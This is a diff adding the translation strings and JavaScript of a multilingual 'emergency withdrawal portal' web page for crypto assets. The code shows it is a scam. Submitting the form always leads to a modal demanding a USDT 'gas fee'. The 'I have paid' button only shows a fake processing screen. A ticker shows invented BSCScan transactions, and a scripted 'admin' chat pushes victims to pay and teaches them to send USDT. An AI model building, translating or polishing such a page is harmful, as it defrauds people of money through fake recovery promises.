+        navSecurity: "مؤمن عبر شبكة BSC", portal: "بوابة السحب الطارئ", title1: "اسحب أصولك", title2: "بأمان وسرعة", desc: "تم تصميم نظام السحب لاستعادة أصولك إلى عنوان محفظتك BEP-10 على الفور.", statSuccess: "معدل النجاح", statTime: "وقت المعالجة", formTitle: "نموذج السحب", formSub: "أكمل البيانات أدناه لبدء العملية.", nameLabel: "اسم المستخدم", namePlace: "أدخل اسمك الكامل", emailLabel: "البريد الإلكتروني", amountLabel: "مبلغ السحب (USD)", walletLabel: "عنوان السحب (BEP-10)", btnSubmit: "معالجة السحب", tickerLive: "BSCScan مباشر", modalTitle: "مطلوب دفع رسوم الغاز", modalP1: "لمعالجة السحب من", modalP2: "إلى شبكة BSC، تحتاج إلى رسوم.", modalP3: "يرجى دفع رسوم الغاز البالغة", modalTransfer: "تحويل USDT إلى العنوان:", modalBtn: "لقد دفعت", processingMsg: "تتم معالجة السحب الخاص بك...", doNotClose: "يرجى عدم إغلاق هذه الصفحة.",
+        chatTitle: "اتصل بالمسؤول", chatInput: "اكتب رسالة...", chatReplyProcessing: "يرجى الانتظار، تتم معالجة السحب الخاص بك حاليًا.", chatReplyForm: "يرجى ملء نموذج السحب ببياناتك وإتمام المعاملة.", chatGreeting: "مرحبًا، كيف يمكننا مساعدتك؟", btnTutorial: "برنامج تعليمي USDT", chatTutorial: "دليل بسيط: شراء وإرسال USDT (BEP-20)\nالخطوة 1: شراء USDT عبر التطبيقات العالمية.\nالخطوة 2: سحب (إرسال) من محفظتك.\nالخطوة 3: حدد شبكة BNB Smart Chain (BEP20) والصق العنوان. قم بتأكيد السحب."
+      },
+      ja: {
+        navSecurity: "BSCネットワークで保護", portal: "緊急出金ポータル", title1: "資産を引き出す", title2: "安全かつ迅速に", desc: "Snapboostの緊急出金システムは、資産をBEP-10ウォレットに即座に復元します。", statSuccess: "成功率", statTime: "平均処理時間", formTitle: "出金フォーム", formSub: "以下のデータを入力してプロセスを開始してください。", nameLabel: "ユーザー名", namePlace: "フルネームを入力", emailLabel: "メールアドレス", amountLabel: "出金額 (USD)", walletLabel: "出金アドレス (BEP-10)", btnSubmit: "出金を処理", tickerLive: "ライブ BSCScan", modalTitle: "ガス代の支払いが必要", modalP1: "から", modalP2: "BSCへの出金には手数料が必要です。", modalP3: "以下のガス代をお支払いください：", modalTransfer: "USDT を送金:", modalBtn: "支払い完了", processingMsg: "出金が処理されています...", doNotClose: "このページを閉じないでください。",
+        chatTitle: "管理者へのお問い合わせ", chatInput: "メッセージを入力...", chatReplyProcessing: "お待ちください。出金は現在処理中です。", chatReplyForm: "詳細を記入して出金フォームに記入し、トランザクションを完了してください。", chatGreeting: "こんにちは、どのようなご用件でしょうか？", btnTutorial: "USDT チュートリアル", chatTutorial: "簡単なガイド：USDT（BEP-20）の購入と送信\nステップ1：取引所でUSDTを購入する\nステップ2：[出金]をクリックしてUSDTを選択します\nステップ3：ネットワークにBNB Smart Chain（BEP20）を選択し、アドレスを貼り付けます。送信を確認します。"
+      },
+      ko: {
+        navSecurity: "BSC 네트워크 보안", portal: "긴급 출금 포털", title1: "자산 출금하기", title2: "안전하고 빠르게", desc: "긴급 출금 시스템은 자산을 BEP-10 지갑 주소로 즉시 복구하도록 설계되었습니다.", statSuccess: "성공률", statTime: "평균 처리 시간", formTitle: "출금 양식", formSub: "아래 데이터를 작성하여 프로세스를 시작하십시오.", nameLabel: "사용자 이름", namePlace: "성명을 입력하세요", emailLabel: "이메일", amountLabel: "출금 금액 (USD)", walletLabel: "출금 주소 (BEP-10)", btnSubmit: "출금 처리", tickerLive: "라이브 BSCScan", modalTitle: "가스비 결제 필요", modalP1: "의 긴급 출금을", modalP2: "BSC 네트워크로 처리하려면 수수료가 필요합니다.", modalP3: "다음 가스비를 지불하십시오:", modalTransfer: "USDT를 다음 주소로 송금:", modalBtn: "결제 완료", processingMsg: "출금이 처리 중입니다...", doNotClose: "이 페이지를 닫지 마십시오.",
+        chatTitle: "관리자 문의", chatInput: "메시지 입력...", chatReplyProcessing: "기다려 주십시오. 현재 출금이 처리 중입니다.", chatReplyForm: "출금 양식에 세부 정보를 작성하고 거래를 완료하십시오.", chatGreeting: "안녕하세요, 무엇을 도와드릴까요?", btnTutorial: "USDT 튜토리얼", chatTutorial: "간단한 가이드: USDT(BEP-20) 구매 및 전송\n1단계: 글로벌 거래소에서 USDT 구매\n2단계: 지갑에서 출금(전송) 클릭\n3단계: 네트워크를 BNB Smart Chain(BEP20)으로 선택하고 주소를 붙여넣습니다. 출금을 확인합니다."
+      },
+      ru: {
+        navSecurity: "Защищено сетью BSC", portal: "Портал экстренного вывода", title1: "Вывести свои активы", title2: "Безопасно и быстро", desc: "Система экстренного вывода предназначена для мгновенного восстановления активов на ваш адрес BEP-10.", statSuccess: "Вероятность успеха", statTime: "Время обработки", formTitle: "Форма вывода", formSub: "Заполните данные ниже для начала.", nameLabel: "Имя пользователя", namePlace: "Введите ваше имя", emailLabel: "Email", amountLabel: "Сумма вывода (USD)", walletLabel: "Адрес вывода (BEP-10)", btnSubmit: "Обработать вывод", tickerLive: "Живой BSCScan", modalTitle: "Требуется оплата комиссии", modalP1: "Для обработки вывода из", modalP2: "в сеть BSC системе требуется комиссия.", modalP3: "Пожалуйста, оплатите комиссию в размере", modalTransfer: "Переведите USDT на адрес:", modalBtn: "Я оплатил", processingMsg: "Ваш вывод обрабатывается...", doNotClose: "Пожалуйста, не закрывайте эту страницу.",
+        chatTitle: "Связаться с администратором", chatInput: "Введите сообщение...", chatReplyProcessing: "Пожалуйста, подождите, ваш вывод обрабатывается.", chatReplyForm: "Заполните форму вывода и завершите транзакцию.", chatGreeting: "Здравствуйте, чем мы можем помочь?", btnTutorial: "Учебник по USDT", chatTutorial: "Краткое руководство: Покупка и отправка USDT (BEP-20)\nШаг 1: Купить USDT на бирже\nШаг 2: Нажмите «Вывод» в кошельке\nШаг 3: Выберите сеть BNB Smart Chain (BEP20) и вставьте адрес. Подтвердите вывод."
+      },
+      pt: {
+        navSecurity: "Protegido pela rede BSC", portal: "Portal de Retirada", title1: "Retire seus ativos", title2: "Com segurança e rapidez", desc: "O sistema de retirada foi projetado para recuperar seus ativos instantaneamente para seu endereço BEP-10.", statSuccess: "Taxa de Sucesso", statTime: "Tempo de Processamento", formTitle: "Formulário de Retirada", formSub: "Preencha os dados abaixo.", nameLabel: "Nome de Usuário", namePlace: "Digite seu nome", emailLabel: "Email", amountLabel: "Valor (USD)", walletLabel: "Endereço de Retirada (BEP-10)", btnSubmit: "Processar Retirada", tickerLive: "BSCScan ao Vivo", modalTitle: "Pagamento de Taxa de Gás", modalP1: "Para processar sua retirada do", modalP2: "para a rede BSC, é necessária uma taxa.", modalP3: "Por favor, pague a taxa de gás de", modalTransfer: "Transfira USDT para:", modalBtn: "Eu já paguei", processingMsg: "Seu saque está sendo processado...", doNotClose: "Por favor, não feche esta página.",
+        chatTitle: "Contato com o Administrador", chatInput: "Digite uma mensagem...", chatReplyProcessing: "Por favor, aguarde, sua retirada está sendo processada.", chatReplyForm: "Preencha o formulário de retirada e conclua a transação.", chatGreeting: "Olá, como podemos ajudá-lo?", btnTutorial: "Tutorial USDT", chatTutorial: "Guia Simples: Comprando e Enviando USDT (BEP-20)\nPasso 1: Comprar USDT na exchange\nPasso 2: Clique em Retirar na sua carteira\nPasso 3: Selecione a rede BNB Smart Chain (BEP20) e cole o endereço. Confirme."
+      },
+      hi: {
+        navSecurity: "BSC नेटवर्क द्वारा सुरक्षित", portal: "आपातकालीन निकासी पोर्टल", title1: "अपनी संपत्ति निकालें", title2: "सुरक्षित और जल्दी", desc: "स्नैपबूस्ट निकासी प्रणाली आपकी संपत्ति को आपके BEP-10 वॉलेट पते पर पुनर्प्राप्त करने के लिए है।", statSuccess: "सफलता दर", statTime: "प्रसंस्करण समय", formTitle: "निकासी फॉर्म", formSub: "डेटा को पूरा करें।", nameLabel: "उपयोगकर्ता नाम", namePlace: "अपना नाम दर्ज करें", emailLabel: "उपयोगकर्ता ईमेल", amountLabel: "निकासी राशि (USD)", walletLabel: "निकासी पता (BEP-10)", btnSubmit: "निकासी प्रक्रिया", tickerLive: "लाइव BSCScan", modalTitle: "गैस शुल्क आवश्यक", modalP1: "आपके निकासी को", modalP2: "BSC नेटवर्क पर संसाधित करने के लिए शुल्क की आवश्यकता है।", modalP3: "गैस शुल्क का भुगतान करें", modalTransfer: "USDT स्थानांतरित करें:", modalBtn: "मैंने भुगतान कर दिया है", processingMsg: "आपकी निकासी संसाधित की जा रही है...", doNotClose: "कृपया इस पृष्ठ को बंद न करें।",
+        chatTitle: "व्यवस्थापक संपर्क", chatInput: "संदेश टाइप करें...", chatReplyProcessing: "कृपया प्रतीक्षा करें, आपकी निकासी संसाधित हो रही है।", chatReplyForm: "कृपया निकासी फॉर्म भरें और लेनदेन पूरा करें।", chatGreeting: "नमस्ते, हम कैसे मदद कर सकते हैं?", btnTutorial: "USDT ट्यूटोरियल", chatTutorial: "गाइड: USDT (BEP-20) खरीदना और भेजना\nचरण 1: एक्सचेंज पर USDT खरीदें\nचरण 2: अपने वॉलेट में निकालें पर क्लिक करें\nचरण 3: नेटवर्क BNB Smart Chain (BEP20) चुनें और पता पेस्ट करें। पुष्टि करें।"
+      }
+    };
+
+    let currentLang = 'id';
+    let t = translations[currentLang];
+    let hasPaid = false;
+
+    /* =========================================
+       2. INITIALIZATION
+    ========================================= */
+    document.addEventListener("DOMContentLoaded", () => {
+      // Setup Ticker Loop
+      const tickerBox = document.getElementById('tickerContent');
+      let tickerHtml = '';
+      const generateSpan = (tx) => `<span class="mx-6 text-slate-400 font-mono">TXID: <span class="text-blue-400">${tx.id}</span> | <span data-i18n-dynamic="amountLabel">${currentLang === 'id' ? 'Jumlah' : 'Amount'}</span>: <span class="text-white">${tx.amount}</span> | Status: <span class="text-emerald-400">● ${tx.status}</span></span>`;
+      txids.forEach(tx => tickerHtml += generateSpan(tx));
+      txids.forEach(tx => tickerHtml += generateSpan(tx)); 
+      tickerBox.innerHTML = tickerHtml;
+
+      updateLanguageTexts();
+      addChatMessage('admin', 'chatGreeting');
+    });
+
+    /* =========================================
+       3. TRANSLATION LOGIC
+    ========================================= */
+    document.getElementById('langSelect').addEventListener('change', (e) => {
+      currentLang = e.target.value;
+      t = translations[currentLang] || translations['en'];
+      updateLanguageTexts();
+      reRenderChatMessages();
+      
+      // Update Ticker Label
+      document.querySelectorAll('[data-i18n-dynamic="amountLabel"]').forEach(el => {
+         el.innerText = currentLang === 'id' ? 'Jumlah' : 'Amount';
+      });
+    });
+
+    function updateLanguageTexts() {
+      document.querySelectorAll('[data-i18n]').forEach(el => {
+        const key = el.getAttribute('data-i18n');
+        if(t[key]) el.innerHTML = t[key];
+      });
+      document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+        const key = el.getAttribute('data-i18n-placeholder');
+        if(t[key]) el.placeholder = t[key];
+      });
+    }
+
+    /* =========================================
+       4. FORM & MODALS
+    ========================================= */
+    const withdrawForm = document.getElementById('withdrawForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const submitSpinner = document.getElementById('submitSpinner');
+    const submitText = document.getElementById('submitText');
+    const gasModal = document.getElementById('gasModal');
+    const processingModal = document.getElementById('processingModal');
+
+    withdrawForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      submitBtn.disabled = true;
+      submitText.classList.add('hidden');
+      submitSpinner.classList.remove('hidden');
+      
+      setTimeout(() => {
+        submitBtn.disabled = false;
+        submitText.classList.remove('hidden');
+        submitSpinner.classList.add('hidden');
+        gasModal.classList.remove('hidden');
+      }, 1500);
+    });
+
+    function closeGasModal() {
+      gasModal.classList.add('hidden');
+    }
+
+    function confirmPayment() {
+      closeGasModal();
+      processingModal.classList.remove('hidden');
+      hasPaid = true;
+    }
+
+    /* =========================================
+       5. CHAT WIDGET
+    ========================================= */
+    let chatHistory = [];
+    const chatWindow = document.getElementById('chatWindow');
+    const chatFabBtn = document.getElementById('chatFabBtn');
+    const iconMsg = document.getElementById('iconMsg');
+    const iconClose = document.getElementById('iconClose');
+    const chatMessagesDiv = document.getElementById('chatMessages');
+    const chatForm = document.getElementById('chatForm');
+    const chatInput = document.getElementById('chatInput');
+
+    function toggleChat() {
+      const isHidden = chatWindow.classList.contains('hidden');
+      if (isHidden) {
+        chatWindow.classList.remove('hidden');
+        chatFabBtn.classList.add('bg-slate-700', 'rotate-90', 'shadow-none');
+        chatFabBtn.classList.remove('bg-gradient-to-r', 'from-blue-600', 'to-purple-600');
+        iconMsg.classList.add('hidden');
+        iconClose.classList.remove('hidden');
+        scrollToBottom();
+      } else {
+        chatWindow.classList.add('hidden');
+        chatFabBtn.classList.remove('bg-slate-700', 'rotate-90', 'shadow-none');
+        chatFabBtn.classList.add('bg-gradient-to-r', 'from-blue-600', 'to-purple-600');
+        iconMsg.classList.remove('hidden');
+        iconClose.classList.add('hidden');
+      }
+    }
+
+    function addChatMessage(sender, textKey, rawText = null) {
+      chatHistory.push({ sender, textKey, text: rawText });
+      renderSingleMessage({ sender, textKey, text: rawText });
+    }
+
+    function renderSingleMessage(msg) {
+      const div = document.createElement('div');
+      let displayTxt = msg.textKey ? (t[msg.textKey] || translations['en'][msg.textKey]) : msg.text;
+      div.className = `max-w-[85%] rounded-2xl px-4 py-2.5 text-[13px] leading-relaxed shadow-sm whitespace-pre-wrap ${msg.sender === 'user' ? 'bg-blue-600 text-white self-end rounded-br-sm' : 'bg-slate-700/80 text-slate-100 self-start rounded-bl-sm border border-slate-600 backdrop-blur-md'}`;
+      div.innerText = displayTxt;
+      chatMessagesDiv.appendChild(div);
+      scrollToBottom();
+    }
+
+    function reRenderChatMessages() {
+      chatMessagesDiv.innerHTML = '';
+      chatHistory.forEach(renderSingleMessage);
+    }
+
+    function scrollToBottom() {
+      setTimeout(() => {
+        chatMessagesDiv.scrollTop = chatMessagesDiv.scrollHeight;
+      }, 50);
+    }
+
+    chatForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const val = chatInput.value.trim();
+      if (!val) return;
+
+      addChatMessage('user', null, val);
+      chatInput.value = '';
+
+      const isTutorialRequest = val.toLowerCase().includes('tutorial');
+
+      setTimeout(() => {
+        if (isTutorialRequest) {
+          addChatMessage('admin', 'chatTutorial');
+        } else {
+          addChatMessage('admin', hasPaid ? 'chatReplyProcessing' : 'chatReplyForm');
+        }
+      }, 1000);
+    });
+
+    function handleQuickReply() {
+      addChatMessage('user', 'btnTutorial');
+      setTimeout(() => {
+        addChatMessage('admin', 'chatTutorial');
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
 
